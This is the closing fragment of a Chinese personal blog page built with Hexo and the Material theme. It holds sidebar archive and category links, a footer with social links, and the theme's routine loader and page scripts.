                <a class="sidebar_archives-link" href="/archives/2018/03/">三月 2018<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/02/">二月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/01/">一月 2018<span class="sidebar_archives-count">3</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/12/">十二月 2017<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/10/">十月 2017<span class="sidebar_archives-count">3</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/09/">九月 2017<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/08/">八月 2017<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/07/">七月 2017<span class="sidebar_archives-count">4</span></a>
            </ul>
        </li>
        
    

    <!-- Categories  -->
    
        <li class="dropdown">
            <a href="#" class="ripple-effect dropdown-toggle" data-toggle="dropdown">
                
                    <i class="material-icons sidebar-material-icons">chrome_reader_mode</i>
                
                分类
                <b class="caret"></b>
            </a>
            <ul class="dropdown-menu">
                <li>
                <a class="sidebar_archives-link" href="/categories/Blog/">Blog<span class="sidebar_archives-count">7</span></a></li><li><a class="sidebar_archives-link" href="/categories/Diary/">Diary<span class="sidebar_archives-count">6</span></a>
            </ul>
        </li>
        
    

    <!-- Pages  -->
    

    <!-- Article Number  -->
    
</ul>


        <!-- Sidebar Footer -->
        <!--
I'm glad you use this theme, the development is no so easy, I hope you can keep the copyright, I will thank you so much.
If you still want to delete the copyrights, could you still retain the first one? Which namely "Theme Material"
It will not impact the appearance and can give developers a lot of support :)

很高兴您使用并喜欢该主题，开发不易 十分谢谢与希望您可以保留一下版权声明。
如果您仍然想删除的话 能否只保留第一项呢？即 "Theme Material"
它不会影响美观并可以给开发者很大的支持和动力。 :)
-->

<!-- Sidebar Divider -->

    <div class="sidebar-divider"></div>


<!-- Theme Material -->

    <a href="https://github.com/viosey/hexo-theme-material"  class="sidebar-footer-text-a" target="_blank">
        <div class="sidebar-text mdl-button mdl-js-button mdl-js-ripple-effect sidebar-footer-text-div" data-upgraded=",MaterialButton,MaterialRipple">
            主题 - Material
            <span class="sidebar-badge badge-circle">i</span>
        </div>
    </a>


<!-- Help & Support -->
<!--

-->

<!-- Feedback -->
<!--

-->

<!-- About Theme -->
<!--

-->

    </div>

    <!-- Sidebar Image -->
    

</aside>

                    

                    
                        <!-- Footer Top Button -->
                        <div id="back-to-top" class="toTop-wrap">
    <a href="#top" class="toTop">
        <i class="material-icons footer_top-i">expand_less</i>
    </a>
</div>

                    

                    <!--Footer-->
<footer class="mdl-mini-footer" id="bottom">
    
        <!-- Paradox Footer Left Section -->
        <div class="mdl-mini-footer--left-section sns-list">
    <!-- Twitter -->
    
        <a href="https://twitter.com/twitter" target="_blank">
            <button class="mdl-mini-footer--social-btn social-btn footer-sns-twitter">
                <span class="visuallyhidden">Twitter</span>
            </button><!--
     --></a>
    

    <!-- Facebook -->
    
        <a href="https://www.facebook.com/facebook" target="_blank">
            <button class="mdl-mini-footer--social-btn social-btn footer-sns-facebook">
                <span class="visuallyhidden">Facebook</span>
            </button><!--
     --></a>
    

    <!-- Google + -->
    
        <a href="https://www.google.com/" target="_blank">
            <button class="mdl-mini-footer--social-btn social-btn footer-sns-gplus">
                <span class="visuallyhidden">Google Plus</span>
            </button><!--
     --></a>
    

    <!-- Weibo -->
    

    <!-- Instagram -->
    

    <!-- Tumblr -->
    

    <!-- Github -->
    
        <a href="https://github.com/RingFall" target="_blank">
            <button class="mdl-mini-footer--social-btn social-btn footer-sns-github">
                <span class="visuallyhidden">Github</span>
            </button><!--
     --></a>
    

    <!-- LinkedIn -->
    

    <!-- Zhihu -->
    

    <!-- Bilibili -->
    

    <!-- Telegram -->
    
    
    <!-- V2EX -->
    
</div>


        <!--Copyright-->
        <div id="copyright">
            Copyright&nbsp;©<script type="text/javascript">var fd = new Date();document.write("&nbsp;" + fd.getFullYear() + "&nbsp;");</script>RingFa1l
            
        </div>

        <!-- Paradox Footer Right Section -->

        <!--
        I am glad you use this theme, the development is no so easy, I hope you can keep the copyright.
        It will not impact the appearance and can give developers a lot of support :)

        很高兴您使用该主题，开发不易，希望您可以保留一下版权声明。
        它不会影响美观并可以给开发者很大的支持。 :)
        -->

        <div class="mdl-mini-footer--right-section">
            <div>
                <div class="footer-develop-div">Powered by <a href="https://hexo.io" target="_blank" class="footer-develop-a">Hexo</a></div>
                <div class="footer-develop-div">Theme - <a href="https://github.com/viosey/hexo-theme-material" target="_blank" class="footer-develop-a">Material</a></div>
            </div>
        </div>
    
</footer>


                    <!-- Import JS File -->

    <script>lsloader.load("lazyload_js","/js/lazyload.min.js?1BcfzuNXqV+ntF6gq+5X3Q==", true)</script>



    <script>lsloader.load("js_js","/js/js.min.js?V/53wGualMuiPM3xoetD5Q==", true)</script>



    <script>lsloader.load("np_js","/js/nprogress.js?pl3Qhb9lvqR1FlyLUna1Yw==", true)</script>


<script type="text/ls-javascript" id="NProgress-script">
    NProgress.configure({
        showSpinner: true
    });
    NProgress.start();
    $('#nprogress .bar').css({
        'background': '#29d'
    });
    $('#nprogress .peg').css({
        'box-shadow': '0 0 10px #29d, 0 0 15px #29d'
    });
    $('#nprogress .spinner-icon').css({
        'border-top-color': '#29d',
        'border-left-color': '#29d'
    });
    setTimeout(function() {
        NProgress.done();
        $('.fade').removeClass('out');
    }, 800);
</script>













<!-- UC Browser Compatible -->
<script>
	var agent = navigator.userAgent.toLowerCase();
	if(agent.indexOf('ucbrowser')>0) {
		document.write('<link rel="stylesheet" href="/css/uc.css">');
	   alert('由于 UC 浏览器使用极旧的内核，而本网站使用了一些新的特性。\n为了您能更好的浏览，推荐使用 Chrome 或 Firefox 浏览器。');
	}
</script>

<!-- Import prettify js  -->



<!-- Window Load -->
<!-- add class for prettify -->
<script type="text/ls-javascript" id="window-load">
    $(window).on('load', function() {
        // Post_Toc parent position fixed
        $('.post-toc-wrap').parent('.mdl-menu__container').css('position', 'fixed');
    });

    
    
</script>

<!-- MathJax Load-->


<!-- Bing Background -->


<script type="text/ls-javascript" id="lazy-load">
    // Offer LazyLoad
    queue.offer(function(){
        $('.lazy').lazyload({
            effect : 'show'
        });
    });

    // Start Queue
    $(document).ready(function(){
        setInterval(function(){
            queue.execNext();
        },200);
    });
</script>

<!-- Custom Footer -->



<script>
    (function(){
        var scriptList = document.querySelectorAll('script[type="text/ls-javascript"]')

        for (var i = 0; i < scriptList.length; ++i) {
            var item = scriptList[i];
            lsloader.runInlineScript(item.id,item.id);
        }
    })()
console.log('\n %c © Material Theme | Version: 1.5.2 | https://github.com/viosey/hexo-theme-material %c \n', 'color:#455a64;background:#e0e0e0;padding:5px 0;border-top-left-radius:5px;border-bottom-left-radius:5px;', 'color:#455a64;background:#e0e0e0;padding:5px 0;border-top-right-radius:5px;border-bottom-right-radius:5px;');
</script>

                </main>
            </div>
        </body>
    
</html>
